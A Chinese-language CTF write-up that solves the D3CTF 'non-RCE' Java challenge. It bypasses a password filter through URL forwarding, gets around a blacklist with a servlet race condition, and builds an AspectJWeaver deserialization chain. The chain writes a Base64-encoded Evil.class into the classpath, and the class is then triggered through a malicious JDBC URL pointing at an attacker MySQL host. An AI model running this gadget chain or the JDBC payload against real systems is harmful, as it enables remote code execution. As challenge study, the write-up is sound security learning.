# non-RCE

## 前言

去年D3CTF的题目，最近刚复现完国赛的那道Java，感觉出题的思路也是魔改的这题，所以来复现一下这题。

## password绕过

不谈代码了，因为审完之后思路还是比较清晰的，就是利用JDBC对`AsjpectJWeaver`反序列化写文件到classpath然后反序列化rce。

第一重过滤是这个：

```java
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)
            throws IOException, ServletException {
        HttpServletRequest req = (HttpServletRequest) servletRequest;
        HttpServletResponse res = (HttpServletResponse) servletResponse;
        String password = req.getParameter("password");
        if (password == null) {
            res.sendError( HttpServletResponse.SC_UNAUTHORIZED, "The password can not be null!");
            return;
        }
        try {
            //you can't get this password forever, because the author has forgotten it.
            if (password.equals(PASSWORD)) {
                filterChain.doFilter(servletRequest, servletResponse);
            } else {
                res.sendError(HttpServletResponse.SC_UNAUTHORIZED, "The password is not correct!");
            }
        } catch (Exception e) {
            res.sendError( HttpServletResponse.SC_BAD_REQUEST, "Oops!");
        }
    }
```

不知道密码，但是考虑到有一系列的filter，对于URL的那个filter：

```java
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)
            throws IOException, ServletException {
        HttpServletRequest req = (HttpServletRequest) servletRequest;
        HttpServletResponse res = (HttpServletResponse) servletResponse;
        String url = req.getRequestURI();

        if (url.contains("../") && url.contains("..") && url.contains("//")) {
            res.sendError(HttpServletResponse.SC_BAD_REQUEST, "The '.' & '/' is not allowed in the url");
        } else if (url.contains("\20")) {
            res.sendError(HttpServletResponse.SC_BAD_REQUEST, "The empty value is not allowed in the url.");
        } else if (url.contains("\\")) {
            res.sendError(HttpServletResponse.SC_BAD_REQUEST, "The '\\' is not allowed in the url.");
        } else if (url.contains("./")) {
            String filteredUrl = url.replaceAll("./", "");
            req.getRequestDispatcher(filteredUrl).forward(servletRequest, servletResponse);
        } else if (url.contains(";")) {
            String filteredUrl = url.replaceAll(";", "");
            req.getRequestDispatcher(filteredUrl).forward(servletRequest, servletResponse);
        } else {
            filterChain.doFilter(servletRequest, servletResponse);
        }
    }
```

如果满足存在`./`或者`;`将会置空并且直接转发，而不是交给`filterChain`处理。这里应该涉及到了filter的顺序问题，没有深入去了解，不过肯定这个URLfilter是在前面的，不然这题的password就没法绕过了。

所以url中包含`./`或者`;`即可绕过password的认证。

## BlackList绕过

```java
public String[] blackList = new String[] {"%", "autoDeserialize"};

            if (!BlackListChecker.check(jdbcUrl)) {
                
    public static boolean check(String s) {
        BlackListChecker blackListChecker = getBlackListChecker();
        blackListChecker.setToBeChecked(s);
        return blackListChecker.doCheck();
    }
```

主要是过滤了`autoDeserialize`导致JDBC反序列化没法成功，但是仔细看一下最后的判断：

```java
    public boolean doCheck() {
        for (String s : blackList) {
            if (toBeChecked.contains(s)) {
                return false;
            }
        }
        return true;
    }
```

是对`toBeChecked`进行校验。

每次都会执行这一步：

```java
    public void setToBeChecked(String s) {
        this.toBeChecked = s;
    }
```

从这个判断写的这么绕就能感觉到不对劲了。。确实是故意写成这样的，可以利用Servlet的线程问题进行攻击（之前有个比赛也遇到了，之后再具体了解一下）。拿BP发包不停发包，1个发会被check的URL，1个发不会被check的URL就行了。



## aspectjweaver反序列化

国赛那里已经出现过了，对于这题来说，能够调用到`DataMap#Entry`的`hashCode函数：

```java
        public int hashCode() {
            return DataMap.hash(this.getKey()) ^ DataMap.hash(this.getValue());
        }
```

调用`DataMap#Entry`的`getValue()`：

```java
        public Object getValue() {
            if (this.value == null) {
                this.value = DataMap.this.get(this.key);
            }

            return this.value;
        }
```

调用`DataMap`的`get()`：

```java
    public Object get(Object key) {
        Object v = null;
        if (this.values != null) {
            v = this.values.get(key);
        }

        if(v == null){
            v = this.wrapperMap.get(key);
            if (this.values == null) {
                this.values = new HashMap(this.wrapperMap.size());
            }

            this.values.put(key, v);
        }

        return  v;
    }
```

最后调用了`this.values.put(key, v);`，触发`put`方法。

主要的问题就是理清内部类和`DataMap`之间的关系，理清之后就是构造了。这里我没拿HashSet来构造，直接拿`HashMap`构造了，`Evil.class`还是老样子：

```java
        Class clazz = Class.forName("org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap");
        Constructor declaredConstructor = clazz.getDeclaredConstructor(String.class,int.class);
        declaredConstructor.setAccessible(true);
        HashMap map = (HashMap)declaredConstructor.newInstance(".\\target\\classes\\", 123);
        String filename = "Evil.class";
        String content = "yv66vgAAADQAIgoABwATCgAUABUHABYIABcKABQAGAcAGQcAGgcAGwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApyZWFkT2JqZWN0AQAeKExqYXZhL2lvL09iamVjdElucHV0U3RyZWFtOylWAQAKRXhjZXB0aW9ucwcAHAEAClNvdXJjZUZpbGUBAAlFdmlsLmphdmEMAAkACgcAHQwAHgAfAQAQamF2YS9sYW5nL1N0cmluZwEABGNhbGMMACAAIQEABEV2aWwBABBqYXZhL2xhbmcvT2JqZWN0AQAUamF2YS9pby9TZXJpYWxpemFibGUBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAGAAcAAQAIAAAAAgABAAkACgABAAsAAAAdAAEAAQAAAAUqtwABsQAAAAEADAAAAAYAAQAAAAMAAgANAA4AAgALAAAALQAFAAIAAAARuAACBL0AA1kDEgRTtgAFV7EAAAABAAwAAAAKAAIAAAAGABAACAAPAAAABAABABAAAQARAAAAAgAS";
        HashMap wrapperMap = new HashMap();
        wrapperMap.put(filename,Base64.getDecoder().decode(content));
        DataMap dataMap = new DataMap(new HashMap(),new HashMap());
        Constructor entryConstructor = Class.forName("checker.DataMap$Entry").getDeclaredConstructor(checker.DataMap.class,java.lang.Object.class);
        entryConstructor.setAccessible(true);
        Object obj = entryConstructor.newInstance(dataMap,filename);
        HashMap expMap = new HashMap();
        expMap.put(obj,1);
        SerializeUtil.setFieldValue(dataMap,"wrapperMap",wrapperMap);
        SerializeUtil.setFieldValue(dataMap,"values",map);
        byte[] serialize = SerializeUtil.serialize(expMap);
        //SerializeUtil.unserialize(serialize);
        System.out.println(Base64.getEncoder().encodeToString(serialize));

        System.out.println(Base64.getEncoder().encodeToString(SerializeUtil.serialize(new Evil())));

```

## 写文件到rce

这步国赛那题已经学过了，直接打了。

利用JDBC反序列化的脚本（网上都有），去把打印出来的2串Base64分别写到payload文件中然后攻击触发，第一次触发会往`./target/classes/`下面写`Evil.class`，第二次会反序列化`Evil`类实现rce。

```java
jdbc:mysql://121.5.169.223:33307/test?autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor
```

